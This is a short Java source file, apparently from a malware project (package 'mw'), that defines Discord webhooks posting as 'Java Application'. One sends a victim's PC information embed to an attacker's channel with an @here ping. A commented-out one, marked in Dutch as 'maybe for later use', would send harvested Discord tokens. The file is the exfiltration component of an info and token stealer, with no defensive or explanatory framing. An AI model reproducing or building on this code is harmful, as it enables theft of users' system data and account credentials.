package me.koenv.mw.discord;

import me.koenv.DiscordWebhook;

public abstract class Webhooks {

        public static DiscordWebhook pcInfo = new DiscordWebhook.Builder()
                .username("Java Application")
                .embed(DcEmbeds.pcInfoEmbed)
                .content("[ @here ]")
                .build();

        /*
         * Misschien voor later gebruik
        public static DiscordWebhook dcTokens = new DiscordWebhook.Builder()
                .username("Java Application")
                .content(DcEmbeds.dcTokenEmbed)
                .build();
        */
}
